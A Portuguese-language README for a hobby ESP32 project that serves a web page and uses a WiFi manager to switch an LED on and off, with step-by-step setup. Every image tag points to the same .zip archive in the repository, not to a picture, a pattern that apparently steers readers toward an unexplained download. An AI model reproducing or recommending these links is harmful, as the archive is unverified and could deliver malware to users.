# WebServer-Wifi_ESP32

<p align="center"> Web Server + Wifi Manager com ESP32 </p>

<p align="center">
 <a href= "#sobre">Sobre</a> .
 <a href= "#tecnologias">Tecnologias</a> .
 <a href= "#execução">Execução</a> .
 <a href= "#observações">Observações</a> 
</p> 

# Sobre
<p> Visa implementar um código no ESP32, utilizando WEB SERVER + WIFI MANAGER.  </p>
<p> Na qual fará com que o LED, Pino 2 no ESP32, seja ligado/desligado ao executar comandos em um endereço IP, fornecido no Terminal Serial do Arduino IDE. </p>

# Tecnologias
<p> ESP32 </p>
<p> Arduino IDE </p>

# Execução
<p>1° - Clonando o repositório, basta no Arduíno IDE, abrir o arquivo "01_bibliotecas.ino" dessa forma abrirá todos os arquivos. </p>


<p>2° - Agora basta fazer o Upload do arquivo na IDE do Arduíno. </p>

<p>3° - No "Serial Monitor", aparecerá esses dados: </p>

<div align="center">
<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
</div> 

<p>4° - Visualiza as redes Wifi's disponíveis. Aparecerá a rede "ESP32", na qual deverá ser logada pela senha: 123456789</p>

<p>5° - No navegador insira o "AP IP addres": 192.168.4.1 </p>

<p>6° - Selecione a opção "Configure WiFi". Entre com a senha na rede WIFI de sua escolha. </p>

<div align="center">
<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
</div>         

<p>7° - Logue seu dispositivo na mesma rede WIFI colocada anterirmente. </p>

<p>8° - O serial Monitor mostrará "Conectado IP". Copie e cole esse "IP: 192.168.0.27" acrescentado ":8090" no seu navegador </p>

<div align="center">
<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
</div> 

<p>9° - Basta clicar no Botão "LED-OFF" ou "LED-ON", os nomes representam o estado atual do LED. </p>

<div align="center">
<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
</div> 
<div align="center">
<img src="https://github.com/joaopedro711/WebServer-Wifi_ESP32/raw/refs/heads/main/01_bibliotecas/ES_Web_Wifi_Server_3.9.zip" width="300px" />
</div> 

# Observações
<p> Esse projeto, só funciona caso o ESP32 e o dispositivo utilizado para acessar o endereço IP, estejam logados na mesma rede WIFI.</p>
